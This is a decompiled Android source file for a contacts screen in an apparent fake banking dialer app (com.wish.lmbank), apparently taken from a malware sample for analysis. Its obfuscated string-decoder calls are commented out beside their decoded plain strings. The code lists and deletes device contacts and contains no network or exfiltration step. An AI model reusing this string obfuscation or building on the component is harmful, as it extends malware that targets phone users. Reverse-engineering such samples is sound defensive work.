package com.wish.lmbank.dialer.fragment;

import android.content.ContentProviderOperation;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Message;
import android.provider.ContactsContract;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.ExpandableListView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;

import androidx.fragment.app.Fragment;

import com.wish.lmbank.R2;
import com.wish.lmbank.dialer.adapter.ContactAdapter;
import com.wish.lmbank.dialer.bean.ContactBean;
import com.wish.lmbank.dialer.bean.RecyclerContact;
import com.wish.lmbank.dialer.utils.ContactHelper;
import com.wish.lmbank.utils.ContentUtils;
import com.wish.lmbank.utils.LogUtils;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Objects;

import gv00l3ah.mvdt7w.bb7d7pu7;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/dialer/fragment/ContactFragment.class */
public class ContactFragment extends Fragment implements ContactAdapter.OnClickListener {
    private ContactAdapter contactAdapter;
    private Context context;
    private ExpandableListView expandableListview;
    private RelativeLayout footerContainer;
    private LinearLayout llContactDel;
    private String TAG = ContactFragment.class.getName();
    private LinkedHashMap<Character, List<ContactBean>> listLinkedHashMap = new LinkedHashMap<>();
    private ArrayList<RecyclerContact> contactArrayList = new ArrayList<>();
    private HashMap<String,ContactBean> delCallLogHashMap = new HashMap();
    private final Handler handler = new Handler(Looper.myLooper()) { // from class: com.wish.lmbank.dialer.fragment.ContactFragment.1
        @Override // android.os.Handler
        public void handleMessage(Message message) {
            super.handleMessage(message);
            ContactFragment.this.contactAdapter = new ContactAdapter(ContactFragment.this.context, ContactFragment.this.contactArrayList, ContactFragment.this);
            ContactFragment.this.expandableListview.setAdapter(ContactFragment.this.contactAdapter);
            for (int i = 0; i < ContactFragment.this.contactArrayList.size(); i++) {
                ContactFragment.this.expandableListview.expandGroup(i);
            }
        }
    };

    public ContactFragment(RelativeLayout relativeLayout, Context context) {
        this.footerContainer = relativeLayout;
        this.context = context;
    }

    @Override // androidx.fragment.app.Fragment
    public View onCreateView(LayoutInflater layoutInflater, ViewGroup viewGroup, Bundle bundle) {
        View inflate = layoutInflater.inflate(R2.layout.fragment_contact, viewGroup, false);
        ExpandableListView expandableListView = (ExpandableListView) inflate.findViewById(R2.id.expandableListview);
        this.expandableListview = expandableListView;
        expandableListView.setOnGroupClickListener(new ExpandableListView.OnGroupClickListener() { // from class: com.wish.lmbank.dialer.fragment.ContactFragment.2
           
            @Override // android.widget.ExpandableListView.OnGroupClickListener
            public boolean onGroupClick(ExpandableListView expandableListView2, View view, int i, long j) {
                return true;
            }
            
        });
        LinearLayout linearLayout = (LinearLayout) inflate.findViewById(R2.id.llContactDel);
        this.llContactDel = linearLayout;
        linearLayout.setOnClickListener(new View.OnClickListener() { // from class: com.wish.lmbank.dialer.fragment.ContactFragment.3

            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                ContactFragment.this.delContact();
            }
        });
        return inflate;
    }

    /* JADX INFO: Access modifiers changed from: private */
    public void delContact() {
        for (Map.Entry entry : this.delCallLogHashMap.entrySet()) {
            try {
                delContact(ContentUtils.findContactIdByDisplayName(this.context, ((ContactBean) entry.getValue()).displayName));
            } catch (Exception e) {
//                     LogUtils.callLog(this.TAG + bb7d7pu7.m5998("RUkNDAUqBgcdCAodSS8IAAUMDVNJ") + e.getMessage());
                LogUtils.callLog(this.TAG + ", delContact Failed: " + e.getMessage());
            }
        }
        this.llContactDel.setVisibility(View.GONE);
        load();
    }

    @Override // androidx.fragment.app.Fragment
    public void onResume() {
        super.onResume();
        load();
        View view = getView();
        Objects.requireNonNull(view);
        view.setFocusableInTouchMode(true);
        getView().requestFocus();
        getView().setOnKeyListener(new View.OnKeyListener() { // from class: com.wish.lmbank.dialer.fragment._$$Lambda$ContactFragment$wTNFZCOCZKaJdlWHpe3S1FyhNHk

            @Override // android.view.View.OnKeyListener
            public final boolean onKey(View view2, int i, KeyEvent keyEvent) {
                return ContactFragment.this.lambda$onResume$0$ContactFragment(view2, i, keyEvent);
            }
        });
    }

    public /* synthetic */ boolean lambda$onResume$0$ContactFragment(View view, int i, KeyEvent keyEvent) {
        ContactAdapter contactAdapter;
        if (keyEvent.getAction() == 1 && i == 4 && (contactAdapter = this.contactAdapter) != null && contactAdapter.isShowCheck()) {
            this.contactAdapter.hideCheck();
            resetCheck();
            this.contactAdapter.notifyDataSetChanged();
            this.llContactDel.setVisibility(View.GONE);
            this.footerContainer.setVisibility(View.VISIBLE);
            return true;
        }
        return false;
    }

    /* JADX WARN: Type inference failed for: r0v0, types: [com.wish.lmbank.dialer.fragment.ContactFragment$4] */
    private void load() {
        new Thread() { // from class: com.wish.lmbank.dialer.fragment.ContactFragment.4
            @Override // java.lang.Thread, java.lang.Runnable
            public void run() {
                super.run();
                ArrayList arrayList = new ArrayList();
                ContactFragment.this.listLinkedHashMap.clear();
                ArrayList<ContactBean> queryAll = ContactHelper.getInstance(ContactFragment.this.context).queryAll();
                for (int i = 0; i < queryAll.size(); i++) {
                    ContactBean contactBean = queryAll.get(i);
                    char c = contactBean.firstLetter;
                    if (ContactFragment.this.listLinkedHashMap.containsKey(Character.valueOf(c))) {
                        ContactFragment.this.listLinkedHashMap.get(Character.valueOf(c)).add(contactBean);
                    } else {
                        ArrayList arrayList2 = new ArrayList();
                        arrayList2.add(contactBean);
                        ContactFragment.this.listLinkedHashMap.put(Character.valueOf(c), arrayList2);
                    }
                }
                for (Map.Entry entry : ContactFragment.this.listLinkedHashMap.entrySet()) {
                    arrayList.add(new RecyclerContact(((Character) entry.getKey()).charValue(), (List) entry.getValue()));
                }
                ContactFragment.this.contactArrayList = arrayList;
                ContactFragment.this.handler.sendEmptyMessage(1);
            }
        }.start();
    }

    @Override // androidx.fragment.app.Fragment
    public void onDestroy() {
        super.onDestroy();
        this.handler.removeCallbacksAndMessages(null);
    }

    @Override // com.wish.lmbank.dialer.adapter.ContactAdapter.OnClickListener
    public void onLongClick(int i, int i2) {
        if (!this.contactAdapter.isShowCheck()) {
            this.contactAdapter.showCheck();
        }
        refresh(i, i2);
    }

    @Override // com.wish.lmbank.dialer.adapter.ContactAdapter.OnClickListener
    public void onCheck(int i, int i2) {
        refresh(i, i2);
    }

    @Override // com.wish.lmbank.dialer.adapter.ContactAdapter.OnClickListener
    public void onJumpActivity(Class cls, Bundle bundle, boolean z) {
        Intent intent = new Intent();
        intent.setClass(getActivity(), cls);
        intent.putExtras(bundle);
        startActivity(intent);
        if (z) {
            getActivity().finish();
        }
    }

    private void refresh(int i, int i2) {
        this.contactArrayList.get(i).getChildren().get(i2).isCheck = !this.contactArrayList.get(i).getChildren().get(i2).isCheck;
        if (this.contactArrayList.get(i).getChildren().get(i2).isCheck) {
            this.delCallLogHashMap.put(this.contactArrayList.get(i).getChildren().get(i2).displayName, this.contactArrayList.get(i).getChildren().get(i2));
        } else {
            this.delCallLogHashMap.remove(this.contactArrayList.get(i).getChildren().get(i2).displayName);
        }
        this.contactAdapter.notifyDataSetChanged();
        if (this.delCallLogHashMap.isEmpty()) {
            this.llContactDel.setVisibility(View.GONE);
            return;
        }
        this.llContactDel.setVisibility(View.VISIBLE);
        this.footerContainer.setVisibility(View.GONE);
        return;
    }

    private void resetCheck() {
        for (int i = 0; i < this.contactArrayList.size(); i++) {
            for (int i2 = 0; i2 < this.contactArrayList.get(i).getChildren().size(); i2++) {
                this.contactArrayList.get(i).getChildren().get(i2).isCheck = false;
            }
        }
        return;
    }

    private void delContact(long j) {
        ArrayList<ContentProviderOperation> arrayList = new ArrayList<>();
//         arrayList.add(ContentProviderOperation.newDelete(ContactsContract.Contacts.CONTENT_URI).withSelection(bb7d7pu7.m5998("NgANVFY"), new String[]{String.valueOf(j)}).build());
        arrayList.add(ContentProviderOperation.newDelete(ContactsContract.Contacts.CONTENT_URI).withSelection("_id=?", new String[]{String.valueOf(j)}).build());
//         arrayList.add(ContentProviderOperation.newDelete(ContactsContract.Data.CONTENT_URI).withSelection(bb7d7pu7.m5998("GwgeNgoGBx0ICh02AA1UVg"), new String[]{String.valueOf(j)}).build());
        arrayList.add(ContentProviderOperation.newDelete(ContactsContract.Data.CONTENT_URI).withSelection("raw_contact_id=?", new String[]{String.valueOf(j)}).build());
//         arrayList.add(ContentProviderOperation.newDelete(ContactsContract.RawContacts.CONTENT_URI).withSelection(bb7d7pu7.m5998("CgYHHQgKHTYADVRW"), new String[]{String.valueOf(j)}).build());
        arrayList.add(ContentProviderOperation.newDelete(ContactsContract.RawContacts.CONTENT_URI).withSelection("contact_id=?", new String[]{String.valueOf(j)}).build());
        try {
//             getActivity().getContentResolver().applyBatch(bb7d7pu7.m5998("CgYERwgHDRsGAA1HCgYHHQgKHRo"), arrayList);
            getActivity().getContentResolver().applyBatch("com.android.contacts", arrayList);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
